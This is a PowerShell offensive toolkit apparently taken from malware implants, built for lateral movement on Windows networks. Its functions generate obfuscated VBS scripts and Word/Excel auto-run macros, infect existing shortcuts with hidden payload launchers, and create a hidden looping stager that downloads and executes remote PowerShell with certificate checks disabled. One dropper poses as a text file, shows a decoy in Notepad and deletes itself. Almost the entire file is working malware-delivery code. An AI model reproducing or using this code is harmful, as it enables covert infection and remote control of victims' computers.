<#

PS Obfuscator

originally started out as gen-obfuscated which was written in perl. I wanted to 
rewrite that perl script from scratch but instead kinda did it in powershell.

This was due to having the implants being able to generate obfuscated payloads
on there own. 

Not all of the functions from gen-obfuscated have been moved over and some 
of this stuff is original and was never on the perl script to begin with.

The code here has been removed from the implants for stand alone use.
And are tailored for the idea of "user initiated" lateral movement inside 
a network. Which should help remove the need of exploits.


xor-function

#>



function show-help {

$helpSummary = @"


PS Obfuscator


[ simple-downloader "Url-hosting-script" ]
Generates an obfuscated vbs script that 
will download and execute a powershell script. 
It engages in some mind games after execution, 
it rewrites itself into a txt file with 
bogus info and opens in notepad.


[ looping-stager "Url-hosting-script" ]
Generates a command string for use kicks 
of a looping downloader.


[ gen-shorcut "Url-hosting-script" ]
Creates a shortcut that downloads and 
executes the script found in the 
provided url.
	

[ shortcut-infect "name-of-lnk" "Url-hosting-script" ]
Modifies the specified shortcut to run the 
original program and also execute a download 
and execute command string. 
	
   example: "Google Chrome.lnk" "http://some-doman[.]com/hello.ps1" 
   requires the http:// or https:// in the URL.
	

[ obfuscate "name of text file / script" ]
Uses a polyalphabetic obfuscation method 
on base64 strings writes obfuscated string 
to file and provides a de-obfuscation key.


[ de-obfuscate "(name of text file / script), (key)" ]
Performs the inverse of the obfuscation function 
requires the text file with the obfuscated 
base64 data and de-obfuscation key as parameters.


[ gen-key ]
generates a random alphabetic string for 
use with the obfuscate-base64 function.


[ obfuscate-base64 "(action:hide or clear ), (key: obfuscation or de-ofuscation), (base64-string)" ]
The function that contains the obfuscation 
engine, it works only with clear base64 data. 
It's UTF8 so do not use this for powershell 
encoded commands.


[ byte-encode ( binary-to-obfuscate, key ) ]
Performs byte-encoding prior to converting to
obfuscated base64 provide key de-obfuscation.


[ byte-decode ( file-containing-obfu-base64, key ) ]
performs the reverse of byte-encode, requires 
the de-obfuscation key.


[ gen-enccmd "your command string" ]
Generates a PowerShell formatted encoded 
command. Insure to quote your command string.
	
   example: gen-enccmd "cmd /c ipconfig /all"


[ dec-enccmd [Your encoded command string ] 
Decodes the base64 string and displays the 
original string.


IMPORTANT !!!
Be sure to dot source this script or iex to 
import these function into your current 
powershell session for this to work.

example: 

PS C:\>	. .\PSobfuscator.ps1


"@

return $helpSummary
	
}


# encode a string with base64 to prep for obfuscation do not use this for encoded commands since UTF8
function base64string-encode {

	param($string)

	# Use this to encode strings to base64 format
	$encstring = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.getbytes($string))

	return $encstring
}

function base64string-decode {

	param($encstring)

	# Don't have to worry about unsafe url characters since it's content not a url string
	$decstring = [System.Text.Encoding]::UTF8.getString([System.Convert]::Frombase64String($encstring))

	return $decstring
}

function gen-key {

	$charArray = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray()
	1..70 | % { $rchr += $charArray | get-random }
	$randkey = [string]::join("", ($rchr))

	return $randkey

}

#[->] byte encoding decoding are for dealing with binary obfuscation
function byte-encode {

	param($binaryPath)

	$test = Test-Path $binaryPath -IsValid

	if ($test -eq $True)
	{

		$binBytes = get-content -Path $binaryPath -Encoding Byte
		$binb64String = [System.Convert]::ToBase64String($binBytes)

		$key = gen-key

		$obfuscated = obfuscate-base64 hide $key $binb64String
		$obfuscated > 'New-File.txt'

		$report = "[!] Key generated is : $key `n"
		$report += "[!] wrote obfuscated data to New-File.txt!"

		write-output $report

	}


}

#[->] recovers binaries encoded in obfuscated base64 strings  
function byte-decode( $b64file, $key ) {

	if ($key) {

		$test = Test-Path $b64file -IsValid

		if ($test -eq $True)
		{

			$obfb64string = get-content $b64file | Out-String
			$deobfuscated = obfuscate-base64 clear $key $obfb64string

			$bytes = [System.Convert]::FromBase64String($deobfuscated)
			set-content -Path .\change-extension -Value $bytes -Encoding Byte
			
			write-output "[!] created new binary change the extension manually!"

		}

	} else { write-output "[!] Failed! : The required key was not provided." }

}


function gen-enccmd {

	param($clrcmd)

	$bytescmd = [System.Text.Encoding]::Unicode.GetBytes($clrcmd.ToString()) 
	$enccmd = [Convert]::ToBase64String($bytescmd) 

	return $enccmd
}

#[->] decodes a powershell formatted encoded command
function dec-enccmd {

	param($enccmd)

	$cmdString = [System.Text.Encoding]::Unicode.getString([System.Convert]::Frombase64String($enccmd))

	return $cmdString
}


#[->] function for variable name randomization
function rand-str {

        $rint = get-random -max 10 -min 3
        $charArray = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray()
        1..$rint | % { $rchr += $charArray | get-random }
        $randstr = [string]::join("", ($rchr))

        return $randstr
}

# [->] vbs code generator, the obfuscation engine core algo
function obfuscate-cmdstring($cmdstring, $sType, $vbaType) {

	$newline = "`r`n"
	
    	#[->] Obfuscate command string for wscript shell
    	$cmdstrArray = @()
    	[int]$ccnt = '1'
	$cmdfile = $newline	
	
    	foreach ( $char in $cmdstring.GetEnumerator() ) 
	{
		
		#[->] translate to ascii value then do math ops on it
        	$val = [Byte][Char]$char
        	$rnum = get-random -max 9 -min 1
        	$nval = [int]$val - [int]$rnum
        	$hval = [int]$nval / '2'
		
		if ( [int]$ccnt -eq '1' )
		{

			#[->] genrate random variable name then append it to array
			$rvarstr = rand-str
			$rvarstr += rand-str
			$cmdstrArray += $rvarstr
			$cmdfile += $rvarstr + ' =' + ' chr(' + $hval + '+' + $hval + '+' + $rnum + ')'
			
		} else {
		
			$cmdfile += ' &chr(' + $hval + '+' + $hval + '+' + $rnum + ')'
		
		}
			#[->] create random legnth of char use
			$randval = get-random -max 12 -min 1
			
        	if ( $randval -eq '8' ) { $cmdfile += $newline; [int]$ccnt = 0 }
       		$ccnt++	

	}
	
    	#[->] concatinate vars to single command string
    	[int]$cnt = 1
    	foreach ( $randvar in $cmdstrArray )
	{
		
		if ( $cnt -eq '1' )
        {
        	$mainRvar = rand-str
        	$cmdfile += $newline
        	$cmdfile += $mainRvar + ' = ' + $randvar

        } else { $cmdfile += ' + ' + $randvar }
			
		$cnt++
	}

	
	if ( $sType -eq 'vbs' ) 
	{
       		#[->] set variables for template generation
       		$vbsCode = $newline

       		#[->] initialize first function in vbs script
       		$randfunc = rand-str
       		$vbsCode += 'Function ' + $randfunc + '() ' + $newline

		#[->] Insert obfuscated command string.
       		$vbsCode += $cmdfile

       		#[->] initalize file system object
       		$fso = rand-str
       		$vbsCode += $newline
       		$vbsCode += 'set ' + $fso + ' = ' + 'createObject("wscript.shell")' + $newline
       		$vbsCode += $fso + '.run ' + $mainRvar + ',' + ' 0, ' + 'false' + $newline
       		$vbsCode += 'End Function' + $newline
       		$vbsCode += $randfunc
	
       		#[->] vbs script in "vbsCode" is ready to be written to disk

		return $vbsCode
		
	}

	if ( $sType -eq 'vba' ) 
	{

		#[->] set variables for template generation
       		$newline = "`r`n"
       		$vbaCode = $newline

       		#[->] initialize first function in vbs script
       		$randfunc = rand-str
       		$vbaCode += 'Sub ' + $randfunc + '() ' + $newline

		#[->] Insert obfuscated command string.
       		$vbaCode += $cmdfile

		#[->] initalize file system object
        	$fso = rand-str
       		$vbaCode += $newline
		$vbaCode += 'set ' + $fso + ' = ' + 'createObject("wscript.shell")' + $newline
        	$vbaCode += $fso + '.run ' + $mainRvar + ',' + ' 0, ' + 'false' + $newline
        	$vbaCode += 'End Sub' + $newline

      		#[->] Set different syntax based upon macro type word vs execl
        	if ( $vbaType -eq "word" ) { $vbaCode += "Sub AutoOpen(): " + $randfunc + ": End Sub" }
        	if ( $vbaType -eq "excel" ) { $vbaCode += "Sub Workbook_Open(): " + $randfunc + ": End Sub" }

		#[->] vba script is ready

        	return $vbaCode

    	}

} # end obfuscate-cmdstring


#[->] requires the name of the shortcut along with a url hosting your PS script
#[->] example: shortcut-Infect "Chrome.lnk" "https://your-domain.com/ps-script"
function shortcut-infect($shortcutFullname, $scriptUrl) {

	if ( $scriptUrl -match 'http://' -Or $scriptUrl -match 'https://' ) 
	{ 

        	#[->] suppress error messages, makes debugging less annoying
        	#[->] uncomment the code inside catch for more uniform error msg
		
		try { 

			$f = Get-Item $shortcutFullName -erroraction 'silentlycontinue'
           		$fh = $f.OpenWrite()

		} catch { 
			
			$msg = "[!] cannot write to file!"
			return $msg
            		#Write-Warning "Something went wrong!"
            		#Write-Error $_

		}

		if($fh){ $fh.Close() } else { return }
	
		write-output "[*] Infecting shortcut...."

		#[->] extracting original properties from selected icon
		$wsh = New-Object -COM WScript.Shell
		$targetPath = $wsh.CreateShortcut("$shortcutFullname").TargetPath

		$chklnk = 'C:\\windows\\system32\\cmd.exe /c'
		if ( $targetPath -match $chklnk ) { $msg = "[!] This lnk is already done"; return $msg } 

		$workingDir = $wsh.CreateShortcut("$shortcutFullname").WorkingDirectory
	
		#[->] Get name of binary without full path to use as icon target
		$targetBinary = (gci $targetPath -force).Name

		#[->] prep command download string to be passed to obfuscation engine
		$cmdstring = looping-stager $scriptUrl
		
		#[->] Obfuscate first wscript command string
		$vbsfile = obfuscate-cmdstring $cmdstring 'vbs'
		
            	$newline = "`r`n"
		$vbsfile += $newline
	
		#[->] initialize second function 
		$randfunc2 = rand-str
		$vbsfile += 'Function ' + $randfunc2 + '() ' + $newline
		$fso2 = rand-str
		$vbsfile += 'set ' + $fso2 + ' = ' + 'createObject("wscript.shell")' + $newline
		$vbsfile += $fso2 + '.run ' +  '"' + 'cmd /c ' + 'start ' + $targetBinary +  '"' + ',' + ' 0, ' + 'false' + $newline
		$vbsfile += 'End Function' + $newline
		$vbsfile += $randfunc2
	
		#[->] vbs script in "vbsfile" is ready to be written to disk
		#[->] create vbs script then change attribute to hidden
		$saveDir = (gci $shortcutFullname).DirectoryName + '\'
	
		$rand = rand-str; $vbsName = $rand + '.vbs'
		$vbspath = $saveDir + $vbsName
	
		set-content $vbspath $vbsfile -Encoding ASCII
		$vbsAtt = get-item $vbspath
		$vbsAtt.attributes="Hidden"
	
		#[->] Delete original shortcut 
		Remove-Item $shortcutFullname
	
		#[->] Modify values acquired from original shortcut 
		$wsh2 = New-Object -COM WScript.Shell
		$newSc = $shortcutFullname
		$newShortcut = $wsh2.CreateShortcut("$newSc")
		$newShortcut.TargetPath = "c:\windows\system32\cmd.exe"
		$newShortcut.WorkingDirectory = $workingDir

		#[->] Set shortcut arguments	
		$args = '/c ' + '"' + $vbspath + '"'
		$newShortcut.Arguments = "$args"
		$newIcon = $targetPath + ',0'
		$newShortcut.IconLocation = "$newIcon"
		$newShortcut.Save();

		$msg = "[+] finished injecting command string into shortcut."
		return $msg

	} else { $msg = "[!] FAilED!`n[!]You need to use a proper URL format ex: http://ex_domain.com/script or https://ex_domain.com/script"; return $msg }

}

#[->] genrates a command that executes a looping powershell command string 
function looping-stager($scriptUrl) {

	if ( $scriptUrl -match 'http://' -Or $scriptUrl -match 'https://' )
	{

		#[->] prep command download string to be passed to obfuscation engine
		$cmds = 'while(1){try{ powershell -noni -w hidden -exec bypass -c '
		$cmds += '"&{[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};'
		$cmds += 'iex(New-Object System.Net.Webclient).DownloadString(''' + $scriptUrl + ''')}" }'
		$cmds += 'catch{ Start-Sleep -s 10}Start-Sleep -s 5 }'
		$encCmdString = gen-enccmd $cmds
		$cmdstring = 'cmd /q /c powershell.exe -noni -nop -w hidden -exec bypass -enc ' + $encCmdString
	
		return $cmdstring

    	} else {

        	write-output "[!] FAilED!`n[!]You need to use a proper URL"
        	write-output "format ex: http://ex_domain.com/script or https://ex_domain.com/script"
		
    	}

}

#[->] Has a .lnk kick off a looping powershell string.
function gen-shortcut($scriptUrl) {

	if ( $scriptUrl -match 'http://' -Or $scriptUrl -match 'https://' )
    	{

		#[->] prep command download string to be passed to obfuscation engine
		$cmds = 'while(1){try{ powershell -noni -w hidden -exec bypass -c '
		$cmds += '"&{[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};'
		$cmds += 'iex(New-Object System.Net.Webclient).DownloadString(''' + $scriptUrl + ''')}" }'
		$cmds += 'catch{ Start-Sleep -s 10}Start-Sleep -s 5 }'
		$encCmdString = gen-enccmd $cmds
		$argstring = '/q /c powershell.exe -noni -nop -w hidden -exec bypass -enc ' + $encCmdString


		#[->] use obfuscated 
		$wshshell = New-Object -comObject WScript.Shell
		$shortcut = $wshshell.CreateShortcut(".\downloader.lnk")
		$shortcut.TargetPath = "%comspec%"
		$shortcut.IconLocation = "%SystemRoot%\System32\Shell32.dll,21"
		$shortcut.Arguments = "$argstring" 
		$shortcut.Save()
		
		write-output "[+] Genrated lnk file to current working directory."

    	} else {
	
		write-output "[!] Failed!`n[!]You need to use a proper URL"
        	write-output "format ex: http://ex_domain.com/script or https://ex_domain.com/script"

	}

}

#[->] Generates a simple vbs downloader.
function simple-downloader($scriptUrl) {

	if ($scriptUrl)
    	{
		if ( $scriptUrl -match 'http://' -Or $scriptUrl -match 'https://' )
        	{
		
       			#[->] insure cmd string is working or not before intensive debugging
            		$cmdstring = looping-stager $scriptUrl

            		#[->] create vbs script then change attribute to hidden
            		$saveDir = $pwd.Path + '\'

			#[->] insure cmd string is working or not before intensive debugging
            		$vbsCode = obfuscate-cmdstring $cmdstring 'vbs'

            		$rand = rand-str
            		$vbsName = 'contact-' + $rand + '.txt.vbs'
            		$noteName = 'contact-' + $rand + '.txt'
            		$notePath = $saveDir + $noteName
            		$vbspath = $saveDir + $vbsName

            		#[->] cmd string to generate txt file
            		$NPcmdstring = 'cmd /c echo johndoe@yahoo.com > ' + $notePath + ' && notepad ' + $noteName
			$vbsCode += "`r`n"
            		$vbsCode += obfuscate-cmdstring $NPcmdstring 'vbs'
			
			#[->] get vbs code to self-destruct
            		$randFso = rand-str
            		$vbsCode += "`r`n"
            		$vbsCode += 'set ' +  $randFso + ' = ' + 'CreateObject("Scripting.FileSystemObject")' + "`r`n"
            		$vbsCode += $randFso + '.DeleteFile Wscript.ScriptFullName'

            		set-content $vbspath $vbsCode -Encoding ASCII
            		write-output "[+] finished generating obfuscated looping stager."

        	} else {

            		write-output "[!] FAilED!`n[!]You need to use a proper URL"
            		write-output "format ex: http://ex_domain.com/script or https://ex_domain.com/script"
		
        	}

	} else {

        	$usage =  "`n" + '[=>] Ex: RSH => C:\> simple-downloader "https://your-domain.com/ps-script"' + "`n"
        	$usage += '[=>] drops an obfuscated vbs script to the current working folder.' + "`n"
        	$usage += '[=>] Insure that the script to be downloaded is self contained and' + "`n"
        	$usage += '[=>] does not need additional parameters for the C2 ip/port etc...' + "`n"

        	write-output $usage

    	}

}


# action = hide or clear
# key = encrpytion or decryption string
# string = base64 string to either be encrypted or decrypted

function obfuscate-base64( $action, $key, $string ) {

	$alpha = @{ "1" = "A";
		"2" = "B";
		"3" = "C";
		"4" = "D";
		"5" = "E";
		"6" = "F";
		"7" = "G";
		"8" = "H";
		"9" = "I";
		"10" = "J";
		"11" = "K";
		"12" = "L";
		"13" = "M";
		"14" = "N";
		"15" = "O";
		"16" = "P";
		"17" = "Q";
		"18" = "R";
		"19" = "S";
		"20" = "T";
		"21" = "U";
		"22" = "V";
		"23" = "W";
		"24" = "X";
		"25" = "Y";
		"26" = "Z"; 
	}

	$inv_alpha = @{}

	#[->] create another hash table like alpha but with inverted values
	foreach ($l in $alpha.Keys ) { $inv_alpha.add($alpha[$l],$l)}

	$count = 0
	foreach ($ch in $string.GetEnumerator()) 
	{

		$c = [string]$ch
		if ( $c -match '[a-zA-Z]') 
		{

			$ival = $inv_alpha[$c]
			$s = $key[$count]

			if (!$s) { $count = 0; $s = $key[0] }  # reset key to begining

			#[->] juggling variable formats between integer and string methods
			$ss = [string]$s
			$S = $ss.ToUpper()
			$shift = $inv_alpha[$S]

			if ($action -match 'hide' ) 
			{ $val = [int]$ival + [int]$shift } 
			else { $val = [int]$ival - [int]$shift } 

			if ( [int]$val -lt '1'  ) { $val = [int]$val + '26' }
			if ( [int]$val -gt '26' ) { $val = [int]$val - '26' }

			#[->] juggling variable formats between integer and string methods
			$sval = [string]$val
			$char = $alpha[$sval]
			$schar = [string]$char

			if ( $c -cmatch '[a-z]' )
			{ $cipher = $schar.ToUpper(); $ncipher += [string]::join("", ($cipher)) }
			elseif ( $c -cmatch '[A-Z]' )
			{ $cipher = $schar.ToLower(); $ncipher += [string]::join("", ($cipher)) }

			$count++

		} else { $ncipher += [string]::join("", ($c)) }

	}

	$scipher = [string]$ncipher
	return $scipher

}


#[->] requires file name and file path if not in the same running directory
function obfuscate {

	param($filePath)

	$test = Test-Path $filePath -IsValid

	if ($test -eq $True)
	{

		$fileBytes = get-content -Path $filePath -Encoding Byte
		$base64String = [System.Convert]::ToBase64String($fileBytes)

		$nKey = gen-key
		$action = 'hide'

		$obfuscated = obfuscate-base64 ( $action, $nkey, $base64String )
		$obfuscated > 'New-File.txt'

		$report = "[!] Key generated is : $nKey"
		$report += "[!] wrote obfuscated data to New-File.txt!"

		return $report

	} else { $report = "[!] File path is not valid!"; return $report }

}


function de-obfuscate ( $filePath, $key ) {

	if ($key)
	{

		$test = Test-Path $filePath -IsValid
		if ($test -eq $True)
		{

			$fileString = get-content $filePath | Out-String
            		$action = 'clear'

			$obfuscated = obfuscate-base64 ( $action, $key, $fileString )
			$obfuscated > 'New-File.txt'

			$report = "[!] Key generated is : $nKey"
			$report += "[!] wrote obfuscated data to New-File.txt!"

			return $report

		} else { $report = "[!] File path is not valid!"; return $report }


	} else { $report = "[!] You need to provide a de-obfuscation key!"; return $report } 

}

show-help
